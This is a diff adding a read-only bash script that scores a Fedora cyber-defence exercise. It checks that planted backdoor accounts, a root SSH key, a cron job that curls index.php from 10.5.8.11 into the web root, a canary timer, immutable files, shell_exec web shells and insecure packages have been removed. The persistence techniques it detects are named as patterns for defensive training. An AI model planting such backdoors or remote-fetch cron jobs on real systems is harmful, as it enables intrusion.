@@ -1,0 +1,418 @@
+#!/bin/bash
+set -uo pipefail
+
+# Verifies that the vulnerable configurations planted by redhavi-fedora have
+# been removed. This script does not modify the system.
+
+TOTAL_CHECKS=0
+PASSED_CHECKS=0
+FEDORA_ID="unknown"
+EXPECTED_CHECKS=17
+ROOT_KEY_BLOB="${ROOT_KEY_BLOB:-AAAAC3NzaC1lZDI1NTE5AAAAILvd2Ok5Jk5HN1XFacHqgh+c2PhAr26Z8FZ130iaVDUB}"
+CANARY_SERVICE="redhavi-canary.service"
+CANARY_TIMER="redhavi-canary.timer"
+
+if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+    GREEN=$'\033[32m'
+    RED=$'\033[31m'
+    CYAN=$'\033[36m'
+    YELLOW=$'\033[33m'
+    RESET=$'\033[0m'
+else
+    GREEN=""
+    RED=""
+    CYAN=""
+    YELLOW=""
+    RESET=""
+fi
+
+usage() {
+    cat <<'EOF'
+Usage: sudo redhavi-check-fedora
+
+Checks a Fedora system for vulnerable configurations planted by
+redhavi-fedora. It is read-only and never cleans or modifies files.
+
+Options:
+  -h, --help    Show this help message.
+
+Run it as root to inspect root's crontab and SSH key.
+Returns 0 when every check passes and 1 when findings remain.
+EOF
+}
+
+die() {
+    printf '%s[ERROR]%s %s\n' "$RED" "$RESET" "$*" >&2
+    exit 2
+}
+
+ok() {
+    printf '%s[OK]%s  %s\n' "$GREEN" "$RESET" "$*"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+    PASSED_CHECKS=$((PASSED_CHECKS + 1))
+}
+
+bad() {
+    printf '%s[X]%s   %s\n' "$RED" "$RESET" "$*"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+}
+
+warn() {
+    printf '%s[!]%s   %s\n' "$YELLOW" "$RESET" "$*" >&2
+}
+
+info() {
+    printf '%s[INFO]%s %s\n' "$CYAN" "$RESET" "$*"
+}
+
+section() {
+    printf '\n%s=== %s ===%s\n\n' "$CYAN" "$1" "$RESET"
+}
+
+parse_args() {
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                die "Unknown option: $1"
+                ;;
+        esac
+        shift
+    done
+}
+
+require_fedora() {
+    if [ -n "${OS_OVERRIDE:-}" ]; then
+        FEDORA_ID="$OS_OVERRIDE"
+    elif [ -r /etc/os-release ]; then
+        # shellcheck disable=SC1091
+        . /etc/os-release
+        FEDORA_ID="${ID:-unknown}"
+    fi
+
+    [ "$FEDORA_ID" = "fedora" ] || die "This checker only supports Fedora. Detected: $FEDORA_ID"
+    command -v rpm >/dev/null 2>&1 || die "rpm was not found."
+}
+
+require_root() {
+    [ "$(id -u)" -eq 0 ] || die "Run as root: sudo redhavi-check-fedora"
+}
+
+user_has_admin_group() {
+    local groups
+    local user=$1
+
+    groups="$(id -nG "$user" 2>/dev/null || true)"
+    case " $groups " in
+        *" wheel "*|*" sudo "*)
+            return 0
+            ;;
+        *)
+            return 1
+            ;;
+    esac
+}
+
+check_user() {
+    local password_state
+    local shell
+    local user=$1
+
+    if ! getent passwd "$user" >/dev/null 2>&1; then
+        ok "The $user account was removed."
+        ok "$user does not belong to an administrative group."
+        return
+    fi
+
+    shell="$(getent passwd "$user" | awk -F: '{print $7}')"
+    password_state="$(passwd -S "$user" 2>/dev/null | awk '{print $2}')"
+
+    case "$shell:$password_state" in
+        */nologin:*|*/false:*|*:LK|*:L)
+            ok "The $user account cannot log in."
+            ;;
+        *)
+            bad "The $user account can still log in (shell: $shell, status: ${password_state:-unknown})."
+            ;;
+    esac
+
+    if user_has_admin_group "$user"; then
+        bad "$user still belongs to wheel or sudo."
+    else
+        ok "$user does not belong to wheel or sudo."
+    fi
+}
+
+check_users() {
+    section "Users and privileges"
+    check_user ccdc
+    check_user splunk
+}
+
+check_cron() {
+    local cron_content=""
+    local spool
+    local suspicious='curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php'
+
+    section "Cron persistence"
+
+    if command -v crontab >/dev/null 2>&1; then
+        cron_content="$(crontab -u root -l 2>/dev/null || true)"
+    fi
+
+    for spool in /var/spool/cron/root /var/spool/cron/crontabs/root; do
+        if [ -r "$spool" ]; then
+            cron_content+=$'\n'
+            cron_content+="$(cat "$spool")"
+        fi
+    done
+
+    if grep -Fq "$suspicious" <<<"$cron_content"; then
+        bad "Root's crontab still contains the download from 10.5.8.11."
+    else
+        ok "The redhavi-fedora cron job was not found."
+    fi
+}
+
+check_canary_timer() {
+    local artifact
+    local artifacts=()
+    local unit
+
+    section "Dashboard check-in persistence"
+
+    for unit in "$CANARY_SERVICE" "$CANARY_TIMER"; do
+        if command -v systemctl >/dev/null 2>&1; then
+            if systemctl is-active --quiet "$unit" 2>/dev/null; then
+                artifacts+=("active:$unit")
+            fi
+            if systemctl is-enabled --quiet "$unit" 2>/dev/null; then
+                artifacts+=("enabled:$unit")
+            fi
+        fi
+
+        for artifact in \
+            "/etc/systemd/system/$unit" \
+            "/usr/lib/systemd/system/$unit" \
+            "/lib/systemd/system/$unit"; do
+            [ ! -e "$artifact" ] || artifacts+=("file:$artifact")
+        done
+    done
+
+    if [ "${#artifacts[@]}" -gt 0 ]; then
+        bad "The Redhavi dashboard timer still has artifacts: ${artifacts[*]}"
+    else
+        ok "The Redhavi dashboard service and timer were removed."
+    fi
+}
+
+check_immutable() {
+    local attrs
+    local path=$1
+
+    if [ ! -e "$path" ]; then
+        ok "$path does not exist."
+        return
+    fi
+
+    if ! command -v lsattr >/dev/null 2>&1; then
+        bad "lsattr was not found; $path could not be checked."
+        return
+    fi
+
+    if ! attrs="$(lsattr -d "$path" 2>/dev/null | awk '{print $1}')"; then
+        bad "lsattr could not check $path."
+        return
+    fi
+
+    if [[ "$attrs" == *i* ]]; then
+        bad "$path is still immutable."
+    else
+        ok "$path is not immutable."
+    fi
+}
+
+key_file_has_lab_key() {
+    local auth_file=$1
+
+    awk -v key="$ROOT_KEY_BLOB" '
+        {
+            for (field = 1; field <= NF; field++) {
+                if ($field == key) {
+                    found = 1
+                }
+            }
+        }
+        END { exit !found }
+    ' "$auth_file"
+}
+
+check_root_ssh() {
+    local auth_file="/root/.ssh/authorized_keys"
+    local ssh_mode
+
+    section "Root SSH access"
+    check_immutable "$auth_file"
+
+    if [ ! -e "$auth_file" ]; then
+        ok "$auth_file does not contain the lab key."
+    elif [ ! -f "$auth_file" ] || [ ! -r "$auth_file" ]; then
+        bad "$auth_file could not be inspected."
+    elif key_file_has_lab_key "$auth_file"; then
+        bad "$auth_file still contains the redhavi-fedora SSH key."
+    else
+        ok "The redhavi-fedora SSH key was removed; other keys are not penalized."
+    fi
+
+    if [ -d /root/.ssh ]; then
+        ssh_mode="$(stat -c '%a' /root/.ssh 2>/dev/null || true)"
+        info "/root/.ssh has mode ${ssh_mode:-unknown}; this is not scored because redhavi-fedora does not change it."
+    else
+        info "/root/.ssh does not exist; this is not scored."
+    fi
+}
+
+report_immutable_info() {
+    local attrs
+    local path=$1
+
+    if [ ! -e "$path" ]; then
+        info "$path does not exist; this is not scored."
+    elif command -v lsattr >/dev/null 2>&1 \
+        && attrs="$(lsattr -d "$path" 2>/dev/null | awk '{print $1}')"; then
+        if [[ "$attrs" == *i* ]]; then
+            info "$path is immutable; this is not scored."
+        else
+            info "$path is not immutable; this is not scored."
+        fi
+    else
+        info "The attributes for $path could not be read; this is not scored."
+    fi
+}
+
+check_webshell_file() {
+    local matches
+    local web_file=$1
+
+    if [ ! -e "$web_file" ]; then
+        ok "$web_file was removed and does not contain shell_exec."
+        return
+    fi
+
+    if [ ! -f "$web_file" ] || [ ! -r "$web_file" ]; then
+        bad "$web_file could not be inspected."
+        return
+    fi
+
+    matches="$(grep -nHE 'shell_exec[[:space:]]*\(' "$web_file" 2>/dev/null || true)"
+    if [ -n "$matches" ]; then
+        bad "$web_file still contains shell_exec:"
+        printf '%s\n' "$matches"
+    else
+        ok "$web_file does not contain shell_exec."
+    fi
+}
+
+check_web() {
+    local web_file
+    local web_files=(
+        /var/www/simple-php-website/index.php
+        /var/www/index.php
+        /var/www/html/index.php
+    )
+
+    section "Web and PHP content"
+
+    # redhavi-fedora only applies chattr +i to the first file.
+    check_immutable "${web_files[0]}"
+    report_immutable_info "${web_files[1]}"
+    report_immutable_info "${web_files[2]}"
+
+    for web_file in "${web_files[@]}"; do
+        check_webshell_file "$web_file"
+    done
+}
+
+check_packages() {
+    local package
+    local insecure_packages=(telnet ftp tftp tftp-server vsftpd)
+
+    section "Insecure packages"
+
+    for package in "${insecure_packages[@]}"; do
+        if rpm -q "$package" >/dev/null 2>&1; then
+            bad "The insecure $package package is still installed."
+        else
+            ok "The insecure $package package is not installed."
+        fi
+    done
+}
+
+check_services() {
+    local unit
+    local unsafe_units=(vsftpd.service tftp.service tftp.socket)
+
+    section "Insecure services (informational, not scored)"
+
+    if ! command -v systemctl >/dev/null 2>&1; then
+        warn "systemctl was not found; service checks were skipped."
+        return
+    fi
+
+    for unit in "${unsafe_units[@]}"; do
+        if systemctl is-active --quiet "$unit" 2>/dev/null || systemctl is-enabled --quiet "$unit" 2>/dev/null; then
+            info "$unit is active or enabled."
+        else
+            info "$unit is neither active nor enabled."
+        fi
+    done
+}
+
+print_summary() {
+    local failed
+    local percent
+
+    if [ "$TOTAL_CHECKS" -ne "$EXPECTED_CHECKS" ]; then
+        die "Internal error: $TOTAL_CHECKS checks ran; expected $EXPECTED_CHECKS."
+    fi
+
+    failed=$((EXPECTED_CHECKS - PASSED_CHECKS))
+    percent=$((100 * PASSED_CHECKS / EXPECTED_CHECKS))
+
+    section "Final result"
+    printf '%sTotal:%s       %d\n' "$YELLOW" "$RESET" "$EXPECTED_CHECKS"
+    printf '%sPassed:%s      %d\n' "$YELLOW" "$RESET" "$PASSED_CHECKS"
+    printf '%sFindings:%s    %d\n' "$YELLOW" "$RESET" "$failed"
+    printf '%sScore:%s       %d%%\n' "$YELLOW" "$RESET" "$percent"
+
+    if [ "$failed" -eq 0 ]; then
+        printf '\n%sThe system is clean according to the redhavi-fedora checks.%s\n' "$GREEN" "$RESET"
+        return 0
+    fi
+
+    printf '\n%s%d findings still need remediation.%s\n' "$RED" "$failed" "$RESET"
+    return 1
+}
+
+main() {
+    parse_args "$@"
+    require_fedora
+    require_root
+
+    printf '\n%s=== Fedora CCDC cleanup verification ===%s\n' "$CYAN" "$RESET"
+    printf '%sDetected system:%s %s\n' "$YELLOW" "$RESET" "$FEDORA_ID"
+
+    check_users
+    check_cron
+    check_canary_timer
+    check_root_ssh
+    check_web
+    check_packages
+    check_services
+    print_summary
+}
+
+main "$@"
